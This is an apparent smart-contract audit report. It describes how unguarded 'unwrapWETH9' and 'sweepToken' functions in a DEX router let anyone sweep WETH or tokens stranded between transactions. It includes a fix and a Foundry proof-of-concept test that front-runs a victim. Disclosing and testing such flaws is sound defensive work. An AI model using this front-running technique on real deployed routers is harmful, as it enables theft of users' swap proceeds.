Audit Report

## Title
Unguarded `unwrapWETH9` and `sweepToken` Allow Any Caller to Drain Router-Held WETH/Tokens to an Arbitrary Recipient — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`unwrapWETH9` is `public payable` with no caller restriction. It reads the router's **entire** WETH balance and forwards it as ETH to an arbitrary `recipient` supplied by the caller. Any WETH that lands on the router between transactions — including WETH output from a swap where the user set `recipient = address(router)` — can be stolen by any third party before the victim calls `unwrapWETH9`. The same design flaw applies to `sweepToken`.

## Finding Description

`PeripheryPayments.sol` L37–45 confirms three properties that combine to create the vulnerability:

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
}
```

1. **No access control.** The function is `public`; any EOA or contract can call it at any time.
2. **Whole-balance sweep.** It reads `IERC20(WETH).balanceOf(address(this))` — the full router balance — not an amount attributed to the caller.
3. **Caller-chosen recipient.** ETH is forwarded to an arbitrary `recipient` argument, not to `msg.sender`.

The intended usage pattern (confirmed in the test suite at `MetricOmmSimpleRouter.native.t.sol` L135–162) is to combine the swap and the unwrap atomically inside a single `multicall`. The `multicall` implementation uses `functionDelegateCall` (`MetricOmmSimpleRouter.sol` L42), which preserves `msg.sender` as the user's EOA throughout the call.

When a user instead issues two separate transactions — `exactInputSingle(…, recipient=router)` followed by `unwrapWETH9(amountMinimum, victim)` — there is a window between the two transactions during which any attacker can call `unwrapWETH9(0, attacker)` and receive the victim's ETH. Passing `amountMinimum = 0` trivially satisfies the guard at L39 even when the balance is dust.

The same issue applies to `sweepToken` at L48–55: any ERC-20 stranded on the router between transactions can be swept to an attacker-chosen address.

## Impact Explanation

Direct theft of user ETH (or ERC-20) output. A victim who routes a token→WETH swap with `recipient = address(router)` and then calls `unwrapWETH9` in a separate transaction loses the full swap output to a front-running attacker. Impact is **High**: complete loss of the user's swap proceeds with no recovery path. This falls squarely under the allowed impact gate: "Critical/High/Medium direct loss of user principal."

## Likelihood Explanation

The attack requires only that WETH sits on the router between two transactions. This occurs whenever a user does not use `multicall` to atomically combine the swap and the unwrap — a common mistake for users interacting directly with the router via Etherscan, a custom script, or a wallet that does not compose multicalls. A mempool-watching bot can automate the front-run with zero cost beyond gas. The `amountMinimum = 0` bypass means no precondition on balance size is needed.

## Recommendation

Restrict `unwrapWETH9` and `sweepToken` so that only `msg.sender` can be the `recipient`. The simplest fix removes the `recipient` parameter and always sends to `msg.sender`. This preserves the `multicall` pattern because `multicall` uses `delegatecall`, so `msg.sender` inside each sub-call is the user's EOA:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}
```

Apply the same change to `sweepToken`.

## Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_victim_weth_output() public {
    // 1. Victim swaps token1 → WETH, output goes to router (tx 1)
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: 3_000,
        amountOutMinimum: 0,
        recipient: address(router),   // WETH lands on router
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0);

    // 2. Attacker front-runs victim's unwrapWETH9 call (tx 2, before victim's tx 2)
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0 bypasses the guard

    // 3. Attacker receives victim's ETH; victim gets nothing
    assertEq(attacker.balance - attackerEthBefore, routerWeth);
    assertEq(weth.balanceOf(address(router)), 0);
}
```
